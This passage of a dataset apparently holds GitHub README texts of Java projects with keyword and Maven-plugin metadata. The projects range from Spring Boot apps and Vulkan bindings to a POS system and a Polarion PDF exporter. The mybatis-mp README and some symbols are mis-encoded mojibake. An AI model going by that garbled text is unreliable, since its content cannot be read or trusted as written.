",0,0,6,0.0,"['context', 'project', 'assignment', 'introduction', 'table', 'content', 'project', 'structure', 'controller', 'service', 'database', 'schema', 'definition', 'technical', 'choice', 'business', 'choice', 'index', 'orm', 'migration', 'initial', 'data', 'dump', 'api', 'endpoint', 'customer', 'internal', 'management', 'public', 'api', 'definition', 'specific', 'implementation', 'general', 'feature', 'optimization', 'validation', 'implementation', 'authentication', 'authorization', 'exception', 'handle', 'infra', 'cache', 'image', 'building', 'jvm', 'option', 'observability', 'metric', 'log', 'log', 'strategy', 'tracing', 'profile', 'unit', 'integration', 'test', 'strategy', 'application', 'test', 'git', 'workflow', 'release', 'workflow', 'hotfix', 'workflow', 'branch', 'strategy', 'continuous', 'deployment', 'strategy', 'deployment', 'area', 'improvement', 'github', 'action', 'configuration', 'branch', 'develop', 'branch', 'main', 'github', 'environment', 'release', 'application', 'production', 'recommendation', 'monitor', 'log', 'alert', 'probably', 'indicate', 'query', 'need', 'kill', 'could', 'degrade', 'system', 'your', 'change', 'data', 'capture', 'cdc', 'system', 'might', 'encounter', 'exception', 'cause', 'replication', 'process', 'stop', 'be', 'careful', 'disk', 'size', 'grow', 'indefinitely', 'usually', 'pretty', 'bad', 'decrease', 'disk', 'size', 'clean', 'wal', 'pay', 'extra', 'fee', 'disk', 'size', 'use', 'high', 'availability', 'ha', 'database', 'security', 'us', 'adequate', 'request', 'resource', 'always', 'set', 'request', 'equal', 'limit', 'set', 'cpu', 'limit', 'important', 'deployment', 'prevent', 'cpu', 'throttling', 'tighten', 'security', 'context', 'necessary', 'readonly', 'system', 'format', 'postman', 'collection', 'run', 'project', 'dependency', 'run', 'project', 'debug', 'project', 'test', 'project', 'clean', 'project']","['project', 'strategy', 'log', 'test', 'workflow']",1.0,"[com.mysema.maven:apt-maven-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.cyclonedx:cyclonedx-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
ashokitschool/Microservices_Zero_To_Hero,main,"# Microservices_Zero_To_Hero

## Day-01 : https://youtu.be/f2SdepNqoMo

## Day-02 : https://youtube.com/live/act5MPpiaVM?feature=share

## Day-03 : https://youtu.be/yK1eCuXDrfY

## Day-04 : https://youtu.be/SBPQuQw0lTo
",0,0,1,0.0,"['http', 'http', 'http', 'http']",['http'],7.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,7.0,0.0
FlavorMate/flavormate-server,main,"# FlavorMate

This is the Project for the FlavorMate backend, which is written in Java with Spring Boot.

## Getting Started

### Docker

1. Create a `docker-compose.yaml`-file (or download one from the [examples](./example))
2. Create the folders the container mounts.
3. Create a `secret.key`-file with `openssl rand -hex 64 > secret.key` and copy it into the right folder.
4. Download the [.env.template](./example/.env.template)-file and rename it to `.env`.
5. Enter your details in the `.env`-file
6. Start your container with `docker compose up -d --remove-orphans`

### Barebone

You must have these dependencies installed:

- Postgresql
- Java 21

1. Download the latest [FlavorMate-Server.jar]().
2. Create a `secret.key`-file with `openssl rand -hex 64 > secret.key` and copy it into the right folder.
3. Download the [.env.template](./example/.env.template)-file and rename it to `.env`.
4. Enter your details in the `.env`-file
5. Export your `.env`-file
6. Start the backend with
   ` java -jar -Dspring.profiles.active=release FlavorMate-Server.jar`.

## Environment Variables

| Key                             | Required | Description                                                                                                                     | Example                               | Default                               |
|---------------------------------|----------|---------------------------------------------------------------------------------------------------------------------------------|---------------------------------------|---------------------------------------|
| FLAVORMATE_DATA_PATH            | No       | Path where files (e.g. recipe pictures) are saved                                                                               | `file:${user.home}/.flavormate/files` | `file:${user.home}/.flavormate/files` |
| FLAVORMATE_PORT                 | No       | Port the server runs inside the container                                                                                       | `8095`                                | `8095`                                |
| FLAVORMATE_HIGHLIGHT_COUNT      | No       | Amount of highlights getting generated                                                                                          | `14`                                  | `14`                                  |
| FLAVORMATE_PATH                 | No       | The path the server uses. Useful when hosting frontend and backend on the same url                                              | `/api`                                |                                       |                                     |
| FLAVORMATE_JWT_TOKEN            | No       | The path where the `secret.key`-file is saved                                                                                   | `/opt/app/secret.key`                 | `/opt/app/secret.key`                 |
| FLAVORMATE_BACKEND_URL          | Yes      | The URL the server is running on. Including the port if it is non standard                                                      | `http://localhost:8095`               |                                       |
| FLAVORMATE_FRONTEND_URL         | No       | Is only needed for links inside mails (e.g. password reset). [WebApp](https://github.com/FlavorMate/flavormate-app) is required | `https://app.flavormate.de`           |                                       |
| FLAVORMATE_ADMIN_USERNAME       | Yes      | Username for the admin account                                                                                                  | `admin`                               |                                       |
| FLAVORMATE_ADMIN_DISPLAYNAME    | Yes      | Display name for the admin account                                                                                              | `Administrator`                       |                                       |
| FLAVORMATE_ADMIN_MAIL           | Yes      | Mail address for the admin account                                                                                              | `example@localhost.de`                |                                       |
| FLAVORMATE_ADMIN_PASSWORD       | Yes      | Password for the admin account                                                                                                  | `Passw0rd!`                           |                                       |
| FLAVORMATE_FEATURE_STORY        | No       | Enables the functionality to create and view stories                                                                            | `true`                                | `true`                                |
| FLAVORMATE_FEATURE_REGISTRATION | No       | Allows the user to sign up. An admin has to activate the user.                                                                  | `true`                                | `false`                               |
| FLAVORMATE_FEATURE_RECOVERY     | No       | Allows the user to reset its password. (Mail config is required!)                                                               | `true`                                | `false`                               |
| FLAVORMATE_FEATURE_BRING        | No       | Enabled the bring integration                                                                                                   | `true`                                | `false`                               |
| DB_HOST                         | Yes      | Host address for the postgres database                                                                                          | `localhost:5432`                      |                                       |
| DB_USER                         | Yes      | User for the postgres database                                                                                                  | `flavormate`                          |                                       |
| DB_PASSWORD                     | Yes      | Password for the postgres database                                                                                              | `Passw0rd!`                           |                                       |
| DB_DATABASE                     | Yes      | Database name for the postgres database                                                                                         | `flavormate`                          |                                       |
| MAIL_FROM                       | No       | Mail From header                                                                                                                | `FlavorMate <noreply@example.de>`     |                                       |       
| MAIL_HOST                       | No       | Mail host                                                                                                                       | `smtp.example.com`                    |                                       |
| MAIL_PORT                       | No       | Mail port                                                                                                                       | `465`                                 |                                       |
| MAIL_USERNAME                   | No       | Mail user                                                                                                                       | `noreply@example.com`                 |                                       |
| MAIL_PASSWORD                   | No       | Mail password                                                                                                                   | `Passw0rd!`                           |                                       |
| MAIL_STARTTLS                   | No       | Use StartTLS?                                                                                                                   | `true`                                |                                       |
",2,0,3,5.0,"['flavormate', 'get', 'start', 'docker', 'barebone', 'environment', 'variable']","['flavormate', 'get', 'start', 'docker', 'barebone']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
czelabueno/langchain4j-workflow-examples,main,"# LangChain4j-workflow Examples
This repo have multiple advanced LLM examples using `langchain4j-workflow` and `langchain4j` libs.

## LLM examples
Please note that examples can be modified and more examples will be added over time.

### MoA
- **Mixture-of-Agents (MoA)**:
    - Java example: [`langchain4j-moa`](langchain4j-moa)
    - Based on Paper: https://arxiv.org/pdf/2406.04692
  
### RAG
- **Corrective RAG (CRAG)**:
    - Java example: [`langchain4j-corrective-rag`](langchain4j-corrective-rag)
    - Based on Paper: https://arxiv.org/pdf/2401.15884
- **Adaptive RAG**:
    - Java example: _Very soon_
    - Based on Paper: https://arxiv.org/pdf/2403.14403
- **Self RAG**:
    - Java example: _Very soon_
    - Based on Paper: https://arxiv.org/pdf/2310.11511
- **Modular RAG**:
    - Java example: _Very soon_
    - Based on Paper: https://arxiv.org/pdf/2312.10997v1

### Agent Architectures
- **Multi-agent Collaboration**:
    - Java example: _Very soon_
    - Based on Paper: https://arxiv.org/pdf/2308.08155
- **Agent Supervisor**:
    - Java example: _Very soon_
    - Based on Paper: https://arxiv.org/pdf/2308.08155
- **Planning Agents**:
    - Java example: _Very soon_
    - Based on Paper: https://arxiv.org/pdf/2305.04091

### Put more examples here.. 

## How contribute?
If you want to contribute with more examples, please follow the steps below:
- Fork this repo
- Create a new branch
- Add your example
- Create a PR
- Wait for the review
- After revision your PR can be merged =)
- Done!

Thank you for your contribution! ğŸš€
",0,0,1,0.0,"['example', 'llm', 'example', 'moa', 'rag', 'agent', 'architecture', 'put', 'example', 'here', 'how', 'contribute']","['example', 'llm', 'moa', 'rag', 'agent']",3.0,[],0.0,2.0,1.0
great-jin/windows-process,main,"<h1 align=""center"">Windows Process</h1>

**Read this in other languages: [English](/README.md), [ä¸­æ–‡](/doc/README_ZH.md).**

The `Windows Process` is a application for windows port process management. You can easily use it to show the currently running process, it directly give you the process running port and pid, also provide the ability to kill the process.

## Theory
The application it was simple enough base on the command of `netstat -ano | findstr <port>` and `taskkill -PID <pid> -F`.

In my develop lift, I frequently needed to find what process was currently occupancy some specify port. Basically, I was use the command that just mentioned, imaging the whole progress: open the `cmd` and type the two command one by one.

In fact, it is not difficult enough that people will intolerances, but it is kind tedious if you use it a lot.

So, here we are, I base on `Java Swing` and `Process` develop this program, provide the easy use `GUI` for above operation.


## Manual
There is two way to running the program.

### 1. Run with jar
See the repository release and download the `windows process.zip`, it contain two file `start.vbs` and `windows process.jar`, just double-click the `start.vbs` then application will start.

Notice: The required the `JDK` environment in you PC, the program was developed under `JDK 8`ï¼Œbut it also functional in `JDK 11` or `JDK 17`.

### 2. Run with exe
In this way, it was much easier, just download `windows process.exe` and double click.

It will pop a notice by `exec4j9`, because I use it for package program, just click the confirm and move on.


## Issue
In the use procedure if you have found the bug or have any question, you can ask in this repository issue page.
",3,0,1,0.0,"['theory', 'manual', 'run', 'jar', 'run', 'exe', 'issue']","['run', 'theory', 'manual', 'jar', 'exe']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
joshlong-attic/2024-bootiful-spring-workshop,main,"
# README 

bit.ly/spring-tips-playlist
youtube.com/@coffeesoftware

## Basics
* which IDE? IntelliJ, VSCode, and Eclipse
* your choice of Java: GraalVM
* start.spring.io, an API, website, and an IDE wizard 
* Devtools
* Docker Compose 
* Testcontainers
* banner.txt

## Development Desk Check
* the Spring JavaFormat Plugin 
	* Python, `gofmt`, your favorite IDE, and 
* the power of environment variables
* SDKMAN
	* `.sdkman`
* direnv 
	*  `.envrc`
* a good password manager for secrets 


## Data Oriented Programming in Java 21+ 
* an example

## Beans
* dependency injection from first principles
* bean configuration
* XML
* stereotype annotations
* lifecycle 
	* BeanPostProcessor
	* BeanFactoryPostProcessor
* auto configuration 
* AOP
* Spring's event publisher
* configuration processor

## AOT & GraalVM
* installing GraalVM 
* GraalVM native images 
* basics
* AOT lifecycles

## Data 
* `JdbcClient`
* SQL Initialization
* Flyway
* Spring Data JDBC

## Batch Processing 
* Spring Batch
* load some data from a CSV file to a SQL database

## Scalability 
* non-blocking IO
* virtual threads
* JosÃ© Paumard's demo
* Cora Iberkleid's demo 

## Web Programming
* clients: `RestTemplate`, `RestClient`, declarative interface clients
* REST
	* controllers
	* functional style
* GraphQL 
	* batches


## Architecting for Modularity
* Privacy
* Spring Modulith 
* Externalized messages
* Testing 

## Artificial Intelligence
* what's in a model?
* Spring AI
* `ChatClient`
* prompts
* advisors
* Retrieval Augmented Generation (RAG)

## Microservices
* centralized configuration 
* API gateways 
	* reactive or not reactive
* event bus and refreshable configuration
* service registration and discovery



## Messaging and Integration
* ""What do you mean by Event Driven?""
* Messaging Technologies like RabbitMQ or Apache Kafka
* Spring Integration
* files to events


## Security 
* adding form login to an application
* authentication 
* authorization
* passkeys
* one time tokens
* OAuth 
	* the Spring Authorizatinm Server
	* OAuth clients
	* OAuth resource servers
	* protecting messaging code

## Q&A 
* I may not know, but I probably know who does know...",0,0,1,0.0,"['readme', 'basic', 'development', 'desk', 'check', 'data', 'oriented', 'programming', 'java', 'bean', 'aot', 'graalvm', 'data', 'batch', 'processing', 'scalability', 'web', 'program', 'architecting', 'modularity', 'artificial', 'intelligence', 'microservices', 'message', 'integration', 'security', 'q', 'a']","['data', 'readme', 'basic', 'development', 'desk']",19.0,"[io.spring.javaformat:spring-javaformat-maven-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,19.0,0.0
mybatis-mp/mybatis-mp,main,"# å®˜ç½‘æ–‡æ¡£ï¼š<strong style=""color:red"">http://mybatis-mp.cn </strong> !!!

## å–œæ¬¢çš„æœ‹å‹åŠ å…¥QQç¾¤ï¼š<font color=""red"">121908790</font> ï¼Œç¾¤é‡Œä¸ä»…å¯ä»¥æmybatis-mpæ¡†æ¶é—®é¢˜ï¼Œè¿˜å¯ä»¥å¸®ä½ è§£å†³åç«¯çš„å„ç§é—®é¢˜ï¼

##### å¦å¤–ï¼Œå–œæ¬¢çš„æœ‹å‹ï¼Œå¸®å¿™å…³æ³¨ å’Œ starï¼ˆç‚¹ç‚¹å°çˆ±å¿ƒï¼‰ï¼

> <strong style=""color:red"">ç‰¹åˆ«ç”³æ˜ï¼šç¦æ­¢åœ¨éæ³•é¡¹ç›®ä¸­ä½¿ç”¨ï¼Œå¦åˆ™åæœè‡ªè´Ÿï¼</strong>

<p align=""center"">
    <a target=""_blank"" href=""https://search.maven.org/search?q=mybatis-mp"">
        <img src=""https://img.shields.io/maven-central/v/cn.mybatis-mp/mybatis-mp?label=Maven%20Central"" alt=""Maven"" />
    </a>
    <a target=""_blank"" href=""https://www.apache.org/licenses/LICENSE-2.0.txt"">
		<img src=""https://img.shields.io/:license-Apache2-blue.svg"" alt=""Apache 2"" />
	</a>
    <a target=""_blank"" href='https://gitee.com/mybatis-mp/mybatis-mp'>
		<img src='https://gitee.com/mybatis-mp/mybatis-mp/badge/star.svg' alt='Gitee star'/>
	</a>
</p>

## ä¸ä¼—ä¸åŒçš„ å‡ å¤§äº®ç‚¹ï¼š

#### 1ï¼šmybatis-mp - äº®ç‚¹ä¸€ï¼šå¯è‡ªå®šä¹‰åŠ¨æ€é»˜è®¤å€¼

#### 2ï¼šmybatis-mp - äº®ç‚¹äºŒï¼šæ”¯æŒä¸åŒæ•°æ®åº“IDè‡ªå¢é…ç½®

#### 3ï¼šmybatis-mp - äº®ç‚¹ä¸‰ï¼šé€»è¾‘åˆ é™¤ï¼Œå¯è‡ªåŠ¨å¡«å……åˆ é™¤æ—¶é—´

#### 4ï¼šmybatis-mp - äº®ç‚¹å››ï¼šå¯è‡ªå®šä¹‰sqlï¼ˆsqlæ¨¡æ¿ï¼‰

#### 5ï¼šmybatis-mp - äº®ç‚¹äº”ï¼šmapWithKeyï¼ˆæŠŠæŸ¥è¯¢è½¬æˆä¸€ä¸ª mapï¼‰

#### 6ï¼šmybatis-mp - äº®ç‚¹ å…­ï¼šéƒ¨åˆ†å­—æ®µ æ–°å¢ å’Œ ä¿®æ”¹

#### 7ï¼šmybatis-mp - äº®ç‚¹ä¸ƒï¼šæšä¸¾çš„è‰¯å¥½æ”¯æŒ

#### 8ï¼šmybatis-mp - äº®ç‚¹å…«ï¼šmybatis-xml returnType çš„ ORM æ˜ å°„

#### 9ï¼šmybatis-mp - äº®ç‚¹ä¹ï¼šä¼˜é›…çš„ XMLå’Œ @SelectæŸ¥è¯¢ è‡ªåŠ¨åˆ†é¡µ

#### 10ï¼šmybatis-mp - äº®ç‚¹åï¼šæ”¯æŒå¤šå±‚åµŒå¥—VOï¼Œè‡ªåŠ¨æ˜ å°„ä»¥åŠè‡ªåŠ¨select æ‰€éœ€åˆ—

## ç‰¹å¾

#### 1ã€å¾ˆè½»é‡,éå¸¸è½»é‡

> è½»é‡çº§å°è£…mybatisã€‚
> å…¶ä»–æ¡†æ¶éƒ½æ¯”è¾ƒæ·±åº¦ä¿®æ”¹äº†mybatisæºç ã€‚

#### 2ã€é«˜æ€§èƒ½

> å¯¹æ¯”å…¶ä»–mybatisæ¡†æ¶ï¼Œæ€§èƒ½ä¸å·®ï¼Œæ¥è¿‘æœ€ä¼˜ã€‚

#### 3ã€çµæ´»æ–¹ä¾¿

> ä¸­é«˜åº¦å®ç°ORMï¼ŒæŸ¥è¯¢APIé›¶å­¦ä¹ æˆæœ¬ã€‚

#### 4ã€é«˜å¯ç”¨

> å¯åº”ä»˜90%çš„SQLéœ€æ±‚ã€‚

#### 5ã€å¯é ï¼Œå®‰å…¨

> æ²¡æœ‰è¿‡äºå¤æ‚çš„è®¾è®¡ï¼Œä½†æ˜¯apiå´å¾ˆä¸°å¯Œï¼Œè¶³å¤Ÿä½¿ç”¨ï¼
> å…¶ä»–æ¡†æ¶æˆ–å¤šæˆ–å°‘è®¾è®¡çš„è¿‡äºå¤æ‚ï¼Œåè€Œå®¹æ˜“å‡ºç°å„ç§é—®é¢˜ã€‚

#### 5ã€ä¼˜ç§€çš„åˆ†é¡µå’ŒSQLä¼˜åŒ–èƒ½åŠ›

> è‡ªåŠ¨è¿‡æ»¤å¤šä½™çš„left join
> countæŸ¥è¯¢ è‡ªåŠ¨å»é™¤order by ï¼Œæ— æ•ˆçš„left joinï¼Œä»¥åŠselectéƒ¨åˆ†æ›¿æ¢æˆ select count(*) æˆ– select 1 å åœ¨select count(*)
> å†…ç½®åˆ†é¡µåŠŸèƒ½ï¼Œè¶…çº§ç‰›é€¼ï¼

## QQ ç¾¤

ç¾¤å·ï¼š 121908790 ,é‚€è¯·å„ä½å¤§ç¥å‚ä¸è¡¥å……ï¼Œç»å¯¹å¼€æºï¼Œå¤§å®¶éƒ½å¯ä»¥è¿›è¡Œä»£ç æäº¤ï¼Œå®¡æ ¸é€šè¿‡ä¼šè¿›è¡Œmasteråˆ†æ”¯ã€‚
![](./doc/image/qq-group.png)

# springbootæ¥å…¥ç¤ºä¾‹ï¼š

https://gitee.com/mybatis-mp/mybatis-mp-spring-boot-demo

# å¿«é€Ÿå¼€å§‹

## 1. åŸºäºspring-bootå¼€å‘ (å·²å¼•å…¥springã€springboot åŸºæœ¬ä¾èµ–ï¼Œåˆ›å»ºSpringApplication.runå³å¯å¯åŠ¨)

### 1.1 springboot2 maven é›†æˆ

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>cn.mybatis-mp</groupId>
            <artifactId>mybatis-mp-spring-boot-parent</artifactId>
            <version>1.6.9</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<dependencies>
    <dependency>
        <groupId>cn.mybatis-mp</groupId>
        <artifactId>mybatis-mp-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

### 1.2 springboot3 maven é›†æˆ

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>cn.mybatis-mp</groupId>
            <artifactId>mybatis-mp-spring-boot-parent</artifactId>
            <version>1.6.9-spring-boot3</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<dependencies>
    <dependency>
        <groupId>cn.mybatis-mp</groupId>
        <artifactId>mybatis-mp-spring-boot-starter</artifactId>
    </dependency>
</dependencies>
```

#### 1.3 æ•°æ®æº é…ç½®

é…ç½®spring booté…ç½®æ–‡ä»¶

```yaml
spring.datasource.url=jdbc:mysql://localhost/test
spring.datasource.username=dbuser
spring.datasource.password=dbpass
```

æˆ–è€… è‡ªå·±å®ä¾‹ä¸€ä¸ª DataSource ä¹Ÿå¯ä»¥

```java

@Configuration(proxyBeanMethods = false)
public class DatasourceConfig {

    @Bean
    public DataSource getDataSource() {
        return new EmbeddedDatabaseBuilder()
                .setName(""test_db"")
                .setType(EmbeddedDatabaseType.H2)
                .addScript(""schema.sql"")
                .build();
    }
}

```

## å¼€å§‹ä½¿ç”¨

```
List<SysUser> list = QueryChain.of(sysUserMapper)
    // forSearchåŒ…å«å¿½ç•¥null ã€ç©ºå­—ç¬¦ä¸²ã€å¯¹å­—ç¬¦ä¸²è¿›è¡Œtrimå»ç©ºæ ¼    
    .forSearch()
    .eq(SysUser::getId,1)
    .like(SysUser::getUserName,"" admin "")
    .list();
```

> ä¼˜é›… ç®€å• æ–¹ä¾¿ å¿«æ·

# æ”¯æŒä½œè€…ï¼Œèµä½œè€…ä¸€ç›’ç›’é¥­ï¼ˆ^o^ï¼‰

<img src=""./doc/image/alipay.png"" style=""width:500px"">",9,0,10,9.0,"['strong', 'color', 'red', 'http', 'font', 'red', 'returntype', 'orm', 'qq', 'maven', 'maven']","['red', 'maven', 'strong', 'color', 'http']",7.0,"[org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,6.0,1.0
gufranthakur/CodeLite,master,"# CodeLite

A minimalistic code editor built using Java swing, flatlaf and RSyntaxTextArea. 
This project is meant for learning and experimental purposes, by no means this is a production-ready code editor, but rather a fun attempt to learn and create my own code editor

![Screenshot 2024-10-06 135007](https://github.com/user-attachments/assets/8fe92fed-70f6-4766-939f-de9b4d6775ad)

# Features
* Syntax highlighting
* Auto save
* adding, deleting or renaming files
* open native terminal
* language support for Java, python, C, C++ and Javascript (more to be added soon)
* Dark and light theme
* various color schemes, including Monokai and Eclipse themes.

  # Snapshots

  ![Screenshot 2024-10-06 135111](https://github.com/user-attachments/assets/01ddcdfb-4193-4715-a049-d92649097acf)

  ![Screenshot 2024-10-06 135225](https://github.com/user-attachments/assets/ddd2a519-6f58-4c30-b9c1-1a62ef8ce963)
  
  ![Screenshot 2024-10-06 135324](https://github.com/user-attachments/assets/fdced105-d52d-4cb1-887b-2559fad88b81)
",1,1,1,0.0,"['codelite', 'feature', 'snapshot']","['codelite', 'feature', 'snapshot']",1.0,[],0.0,1.0,0.0
chamithKavinda/Coffee-Shop-POS-JavaEE-Backend,main,"# Caffeine Corner POS - JavaEE Backend
Caffeine Corner is a comprehensive Point of Sale (POS) application designed specifically for coffee shops. It provides an efficient and intuitive system for managing customer interactions,
product inventories, and order transactions. This project serves as an educational resource for mastering Java EE development.

# Project Components
## Front-end
The front-end of Caffeine Corner is crafted to offer a user-friendly interface with seamless interaction.
It utilizes HTML, CSS, jQuery, and Fetch to create a dynamic web application, ensuring a smooth user experience.

## Back-end
The back-end of Caffeine Corner handles server-side operations, data processing, and business logic. 
Implemented using Java EE and hosted on the Apache Tomcat server, it ensures robust performance and reliability for handling transactions and managing data.

### Dashboard View:
![dashboard](https://github.com/user-attachments/assets/c57d1df7-5465-472f-9690-43a8fd220f48)

### Customer Data View:
![Customer](https://github.com/user-attachments/assets/6b8d301c-efa2-4dd2-8046-262706b20ae5)

### Customer Register Form:
![customer add](https://github.com/user-attachments/assets/3d34cffa-a6d6-43ff-a62f-f750a7e04171)

### Customer Data Update Form:
![update customer](https://github.com/user-attachments/assets/abb7aa3c-b8ac-4a7f-a99a-b654649c5433)

### Product Data View:
![product](https://github.com/user-attachments/assets/31dee97a-8c56-4366-9e9e-be7338feec5a)

### Product Add Form:
![add product](https://github.com/user-attachments/assets/2897e147-c3e8-4924-b04b-8a4edb8cc156)

### Product Update Form:
![Update Product](https://github.com/user-attachments/assets/d0c110d8-e4f7-4fbb-879e-e4833bee3573)

### Place Order Form:
![placeOrder](https://github.com/user-attachments/assets/f1d7b6b2-d660-4d2a-80b2-7a73fb0fe813)

# Features

* User-friendly Interface: Designed with an intuitive layout for easy navigation and quick learning. Built using HTML, CSS , JS.
* Reporting and Analytics: Generates detailed reports and alerts on orders, product, and customer data for informed decision-making.
* JavaEE Architecture: Developed with the Java Platform, Enterprise Edition, offering a scalable architecture for enterprise-level applications.
* Apache Tomcat Server: Configured to run on Apache Tomcat, ensuring efficient and reliable web application hosting.
* Data Processing: Implements server-side logic to handle data processing and facilitate seamless communication between the front-end and database.
* Business Rules: Enforces business logic and regulations specific to coffee shop operations.
* Database Interactions: Manages interactions with the database, ensuring data integrity and security.

# Tech Stack
## Front-end:
- HTML
- CSS
- Bootstrap
- jQuery
- Fetch

## Back-end:
- Java EE
- Apache Tomcat

# Database:
* MySQL Connector: Java-based driver for connecting to MySQL databases (Version 8.0.32).
* Java Naming and Directory Interface (JNDI): Java API for connecting to directory services, used for managing database connections efficiently through connection pooling.
 
# Development Tools:
* Maven: Build automation and project management tool (Version 4.0.0)

### Frontend Implementation :
https://github.com/chamithKavinda/Coffee-Shop-POS-System-FrontEnd

# API Endpoint Documentation
* Customer - https://documenter.getpostman.com/view/35385399/2sA3s1oryn
* Product - https://documenter.getpostman.com/view/35385399/2sA3s3FqT2
* Order - https://documenter.getpostman.com/view/35385399/2sA3s3FqT3
* Order Details - https://documenter.getpostman.com/view/35385399/2sA3s3FqT4

",0,0,1,0.0,"['caffeine', 'corner', 'po', 'javaee', 'backend', 'project', 'component', 'dashboard', 'view', 'customer', 'data', 'view', 'customer', 'register', 'form', 'customer', 'data', 'update', 'form', 'product', 'data', 'view', 'product', 'add', 'form', 'product', 'update', 'form', 'place', 'order', 'form', 'feature', 'tech', 'stack', 'database', 'development', 'tool', 'frontend', 'implementation', 'api', 'endpoint', 'documentation']","['form', 'view', 'customer', 'data', 'product']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-war-plugin]",1.0,0.0,0.0
chuigda/vulkan4j,master,"# vulkan4j
[Vulkan](https://www.vulkan.org/) Binding for Java using [Project Panama](https://openjdk.org/projects/panama/) `java.lang.foreign` APIs.

*Heavily inspired by the [`vulkanalia`](https://github.com/KyleMayes/vulkanalia) crate.*

## [Vulkan tutorial](https://vulkan4j.7dg.tech/tutorial/en/)
For users new to Vulkan, there is a (almost) complete adaptation of [https://vulkan-tutorial.com](https://vulkan-tutorial.com) by [Alexander Overvoorde](https://github.com/Overv) to use Java and vulkan4j instead of C++. The published version of this tutorial can be found [here](https://vulkan4j.7dg.tech/tutorial/en/), and the sources for the tutorial (including standalone working code examples for each chapter) can be found under the `tutorial` directory.

## Overview
[`panama-plus`](https://github.com/chuigda/vulkan4j/tree/master/panama-plus) is a small utility library that gives a thin wrapper over Project Panama `java.lang.foreign` APIs to make them easier and more type-safe to use. It is used by `vulkan4j` to provide a more Java-friendly API for Vulkan.

[`vk4j`](https://github.com/chuigda/vulkan4j/tree/master/vk4j) is the main library that provides the Vulkan bindings. Bindings are generated from [`vk.xml`](https://github.com/KhronosGroup/Vulkan-Docs/blob/main/xml/vk.xml) using [`vkxml2java`](https://github.com/chuigda/vulkan4j/tree/master/vk4j/vkxml2java) *(we plan to switch to `codegen` module soon)*.

[`glfw`](https://github.com/chuigda/vulkan4j/tree/master/glfw) is a wrapper around the GLFW library that provides a more Java-friendly API for creating windows and handling input. It is generated from [GLFW header files](https://github.com/glfw/glfw/tree/master/include/GLFW) using the [`codegen`] module.

## Roadmap
- [x] Generate fundamental Vulkan API bindings using `vkxml2java` from `vk.xml`
- [x] Take off!
- [x] Vulkan tutorial
  - [ ] Chinese translation 
- [x] Generate GLFW bindings using `codegen`
- [ ] Switch to `codegen` for Vulkan bindings
- [ ] Generate or write Vulkan Memory Allocator API bindings
- [ ] Generate Vulkan Video API bindings
",1,5,2,1.0,"['vulkan', 'tutorial', 'http', 'overview', 'roadmap']","['vulkan', 'tutorial', 'http', 'overview', 'roadmap']",6.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jetbrains.kotlin:kotlin-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,5.0,1.0
SchweizerischeBundesbahnen/ch.sbb.polarion.extension.pdf-exporter,main,"# Polarion ALM extension to convert Documents to PDF files

This Polarion extension provides possibility to convert Polarion Documents to PDF files.
This is an alternative to native Polarion's solution.
The extension uses [WeasyPrint](https://weasyprint.org/) as a PDF engine and requires it to run in [Docker as Service](#weasyprint-configuration).

## Quick start

Please see separate [quick start page](QUICK_START.md) where briefly summarized all most important and applicable steps and configurations.

If you need deeper knowledge about all possible steps, configurations and their descriptions, please see sections below.

## Build

This extension can be produced using maven:
```bash
mvn clean package
```

## Installation to Polarion

To install the extension to Polarion `ch.sbb.polarion.extension.pdf-exporter-<version>.jar`
should be copied to `<polarion_home>/polarion/extensions/ch.sbb.polarion.extension.pdf-exporter/eclipse/plugins`
It can be done manually or automated using maven build:
```bash
mvn clean install -P install-to-local-polarion
```
For automated installation with maven env variable `POLARION_HOME` should be defined and point to folder where Polarion is installed.

Changes only take effect after restart of Polarion.

## Polarion configuration

### WeasyPrint configuration

This extension supports the use of WeasyPrint as a REST service within a Docker container, as implemented [here](https://github.com/SchweizerischeBundesbahnen/weasyprint-service).
To change WeasyPrint Service URL, adjust the following property in the `polarion.properties` file:

```properties
ch.sbb.polarion.extension.pdf-exporter.weasyprint.service=http://localhost:9080
```

### PDF exporter extension to appear on a Document's properties pane

1. Open a project where you wish PDF Exporter to be available
2. On the top of the project's navigation pane click âš™ (Actions) â™ ğŸ”§ Administration. Project's administration page will be opened.
3. On the administration's navigation pane select Documents & Pages â™ Document Properties Sidebar.
4. In opened Edit Project Configuration editor find `sections`-element:
   ```xml
   â€¦
   <sections>
     <section id=""fields""/>
     â€¦
   </sections>
   â€¦
   ```
5. And insert following new line inside this element:
   ```xml
   â€¦
   <extension id=""pdf-exporter"" label=""PDF Exporter"" />
   â€¦
   ```
6. Save changes by clicking ğŸ’¾ Save

### PDF Exporter view to open via button in toolbar

Alternatively you can configure PDF Exporter such a way that additional toolbar will appear in document's editor with a button to open a popup with PDF Exporter view.

1. Open ""Default Repository"".
2. On the top of its navigation pane click âš™ (Actions) â™ ğŸ”§ Administration. Global administration page will be opened.
3. On the administration's navigation pane select Configuration Properties.
4. In editor of opened page add following line:
   ```properties
